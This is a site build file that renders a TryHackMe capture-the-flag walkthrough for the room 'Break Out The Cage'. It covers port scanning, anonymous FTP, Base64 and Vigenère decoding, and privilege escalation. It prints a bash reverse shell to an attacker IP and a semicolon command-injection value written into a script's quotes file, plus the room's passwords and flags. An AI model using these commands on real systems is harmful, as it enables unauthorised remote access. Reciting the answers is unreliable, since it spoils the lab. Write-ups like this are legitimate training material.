"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[6563],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>m});var a=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=a.createContext({}),c=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},u=function(e){var n=c(e.components);return a.createElement(l.Provider,{value:n},e.children)},p="mdxType",h={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},d=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),p=c(t),d=r,m=p["".concat(l,".").concat(d)]||p[d]||h[d]||o;return t?a.createElement(m,s(s({ref:n},u),{},{components:t})):a.createElement(m,s({ref:n},u))}));function m(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var o=t.length,s=new Array(o);s[0]=d;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[p]="string"==typeof e?e:r,s[1]=i;for(var c=2;c<o;c++)s[c]=t[c];return a.createElement.apply(null,s)}return a.createElement.apply(null,t)}d.displayName="MDXCreateElement"},64615:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>h,frontMatter:()=>o,metadata:()=>i,toc:()=>c});var a=t(87462),r=(t(67294),t(3905));const o={},s="Break Out The Cage",i={unversionedId:"Tryhackme/Break Out The Cage/Break out the cage",id:"Tryhackme/Break Out The Cage/Break out the cage",title:"Break Out The Cage",description:"Help Cage bring back his acting career and investigate the nefarious goings on of his agent!",source:"@site/writeups/Tryhackme/Break Out The Cage/Break out the cage.md",sourceDirName:"Tryhackme/Break Out The Cage",slug:"/Tryhackme/Break Out The Cage/",permalink:"/writeups/Tryhackme/Break Out The Cage/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Brainstorm",permalink:"/writeups/Tryhackme/Brainstorm/"},next:{title:"Break it",permalink:"/writeups/Tryhackme/Break it/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Investigate!",id:"task-1-investigate",level:2}],u={toc:c},p="wrapper";function h(e){let{components:n,...t}=e;return(0,r.kt)(p,(0,a.Z)({},u,t,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"break-out-the-cage"},"Break Out The Cage"),(0,r.kt)("p",null,"Help Cage bring back his acting career and investigate the nefarious goings on of his agent!"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/breakoutthecage1"},"Break Out The Cage")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network ENumeration"),(0,r.kt)("li",{parentName:"ul"},"FTP Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Cryptography",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},"Base64"),(0,r.kt)("li",{parentName:"ul"},"Vigen\xe8re"))),(0,r.kt)("li",{parentName:"ul"},"Abusing SUID/GUID"),(0,r.kt)("li",{parentName:"ul"},"Stored Passwords & Keys")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-investigate"},"Task 1 Investigate!"),(0,r.kt)("p",null,"Let's find out what his agent is up to...."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Break Out The Cage$ sudo nmap -A -p- -sS -sC -sV -O 10.10.192.136\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 20:36 CEST\nNmap scan report for 10.10.192.136\nHost is up (0.034s latency).\nNot shown: 65532 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.8.106.222\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)\n|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)\n|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Nicholas Cage Stories\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/10%OT=21%CT=1%CU=40844%PV=Y%DS=2%DC=T%G=Y%TM=5F81FF\nOS:5F%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST\nOS:11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT      ADDRESS\n1   38.18 ms 10.8.0.1\n2   38.26 ms 10.10.192.136\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 64.32 seconds\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Break Out The Cage$ ftp 10.10.192.136\nConnected to 10.10.192.136.\n220 (vsFTPd 3.0.3)\nName (10.10.192.136:kali): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 0        0            4096 May 25 23:32 .\ndrwxr-xr-x    2 0        0            4096 May 25 23:32 ..\n-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks\n226 Directory send OK.\nftp> get dad_tasks\nlocal: dad_tasks remote: dad_tasks\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for dad_tasks (396 bytes).\n226 Transfer complete.\n396 bytes received in 0.08 secs (4.6068 kB/s)\nftp>\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Break Out The Cage$ cat dad_tasks\nUWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds\nkali@kali:~/CTFs/tryhackme/Break Out The Cage$ cat dad_tasks | base64 -d\nQapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!\nSfw. Kajnmb xsi owuowge\nFaz. Tml fkfr qgseik ag oqeibx\nEljwx. Xil bqi aiklbywqe\nRsfv. Zwel vvm imel sumebt lqwdsfk\nYejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.\n\nIz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl\n')),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://www.guballa.de/vigenere-solver"},"https://www.guballa.de/vigenere-solver")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},'Clear text using key "namelesstwo":')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!\nOne. Revamp the website\nTwo. Put more quotes in script\nThree. Buy bee pesticide\nFour. Help him with acting lessons\nFive. Teach Dad what "information security" is.\n\nIn case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"weston@national-treasure:~$ cat > /tmp/shell.sh << EOF\n> #!/bin/bash\n> bash -i >& /dev/tcp/10.9.0.54/4444 0>&1\n> EOF\nweston@national-treasure:~$ chmod +x /tmp/shell.sh\nweston@national-treasure:~$ printf 'anything;/tmp/shell.sh\\n' > /opt/.dads_scripts/.files/.quotes\nweston@national-treasure:~$\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"cat > /tmp/shell.sh << EOF\n#!/bin/bash\nbash -i >& /dev/tcp/10.8.106.222/4444 0>&1\nEOF\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Break Out The Cage$ nc -nlvp 4444\nlistening on [any] 4444 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.192.136] 52588\nbash: cannot set terminal process group (1583): Inappropriate ioctl for device\nbash: no job control in this shell\ncage@national-treasure:~$ ls -la\nls -la\ntotal 56\ndrwx------ 7 cage cage 4096 May 26 21:34 .\ndrwxr-xr-x 4 root root 4096 May 26 07:49 ..\nlrwxrwxrwx 1 cage cage    9 May 26 07:53 .bash_history -> /dev/null\n-rw-r--r-- 1 cage cage  220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 cage cage 3771 Apr  4  2018 .bashrc\ndrwx------ 2 cage cage 4096 May 25 23:20 .cache\ndrwxrwxr-x 2 cage cage 4096 May 25 13:00 email_backup\ndrwx------ 3 cage cage 4096 May 25 23:20 .gnupg\ndrwxrwxr-x 3 cage cage 4096 May 25 23:40 .local\n-rw-r--r-- 1 cage cage  807 Apr  4  2018 .profile\n-rw-rw-r-- 1 cage cage   66 May 25 23:40 .selected_editor\ndrwx------ 2 cage cage 4096 May 26 07:33 .ssh\n-rw-r--r-- 1 cage cage    0 May 25 23:20 .sudo_as_admin_successful\n-rw-rw-r-- 1 cage cage  230 May 26 08:01 Super_Duper_Checklist\n-rw------- 1 cage cage 6761 May 26 21:34 .viminfo\ncage@national-treasure:~$ cat Super_Duper_Checklist\ncat Super_Duper_Checklist\n1 - Increase acting lesson budget by at least 30%\n2 - Get Weston to stop wearing eye-liner\n3 - Get a new pet octopus\n4 - Try and keep current wife\n5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}\ncage@national-treasure:~$ cat email_backup/*\ncat email_backup/*\nFrom - SeanArcher@BigManAgents.com\nTo - Cage@nationaltreasure.com\n\nHey Cage!\n\nThere's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the\nplanning stages at the moment. I've put a good word in for you, if you're lucky we\nmight be able to get you a part of an angry shop keeping or something? Would you be up\nfor that, the money would be good and it'd look good on your acting CV.\n\nRegards\n\nSean Archer\nFrom - Cage@nationaltreasure.com\nTo - SeanArcher@BigManAgents.com\n\nDear Sean\n\nWe've had this discussion before Sean, I want bigger roles, I'm meant for greater things.\nWhy aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),\nthe new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the\nnew fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.\nI could of made them great... great Sean.... I think you're missing my true potential.\n\nOn a much lighter note thank you for helping me set up my home server, Weston helped too, but\nnot overally greatly. I gave him some smaller jobs. Whats your username on here? Root?\n\nYours\n\nCage\nFrom - Cage@nationaltreasure.com\nTo - Weston@nationaltreasure.com\n\nHey Son\n\nBuddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote\ndown what it said. Could you look into it please? I think it could be something to do with his\naccount on here. I want to know what he's hiding from me... I might need a new agent. Pretty\nsure he's out to get me. The note said:\n\nhaiinspsyanileph\n\nThe guy also seems obsessed with my face lately. He came him wearing a mask of my face...\nwas rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!!\nhahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha\nahahahhahaha. Ahhh Face it... he's just odd.\n\nRegards\n\nThe Legend - Cage\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"cage@national-treasure:~$ python -c 'import pty; pty.spawn(\"/bin/bash\")'\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\ncage@national-treasure:~$ clear\nclear\nTERM environment variable not set.\ncage@national-treasure:~$ su root\nsu root\nPassword: cageisnotalegend\n\nroot@national-treasure:/home/cage# cd /root\ncd /root\nroot@national-treasure:~# ls -la\nls -la\ntotal 52\ndrwx------  8 root root  4096 May 26 09:16 .\ndrwxr-xr-x 24 root root  4096 May 26 07:51 ..\nlrwxrwxrwx  1 root root     9 May 26 07:52 .bash_history -> /dev/null\n-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc\ndrwx------  2 root root  4096 May 26 08:15 .cache\ndrwxr-xr-x  2 root root  4096 May 25 19:25 email_backup\ndrwx------  3 root root  4096 May 26 08:15 .gnupg\ndrwxr-xr-x  3 root root  4096 May 25 23:31 .local\n-rw-r--r--  1 root root   148 Aug 17  2015 .profile\ndrwx------  2 root root  4096 May 25 23:19 .ssh\ndrwxr-xr-x  2 root root  4096 May 26 08:36 .vim\n-rw-------  1 root root 11692 May 26 09:16 .viminfo\nroot@national-treasure:~# cd email_backup\ncd email_backup\nroot@national-treasure:~/email_backup# ls -la\nls -la\ntotal 16\ndrwxr-xr-x 2 root root 4096 May 25 19:25 .\ndrwx------ 8 root root 4096 May 26 09:16 ..\n-rw-r--r-- 1 root root  318 May 25 13:19 email_1\n-rw-r--r-- 1 root root  414 May 25 14:00 email_2\nroot@national-treasure:~/email_backup# cat email_1\ncat email_1\nFrom - SeanArcher@BigManAgents.com\nTo - master@ActorsGuild.com\n\nGood Evening Master\n\nMy control over Cage is becoming stronger, I've been casting him into worse and worse roles.\nEventually the whole world will see who Cage really is! Our masterplan is coming together\nmaster, I'm in your debt.\n\nThank you\n\nSean Archer\nroot@national-treasure:~/email_backup# cat email_2\ncat email_2\nFrom - master@ActorsGuild.com\nTo - SeanArcher@BigManAgents.com\n\nDear Sean\n\nI'm very pleased to here that Sean, you are a good disciple. Your power over him has become\nstrong... so strong that I feel the power to promote you from disciple to crony. I hope you\ndon't abuse your new found strength. To ascend yourself to this level please use this code:\n\nTHM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}\n\nThank you\n\nSean Archer\nroot@national-treasure:~/email_backup# ^C\nkali@kali:~/CTFs/tryhackme/Break Out The Cage$\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"cageisnotalegend")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"What is Weston's password?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Mydadisghostrideraintthatcoolnocausehesonfirejokes")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"What's the user flag?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"THM{M37AL_0R_P3N_T35T1NG}")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"What's the root flag?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}")))}h.isMDXComponent=!0}}]);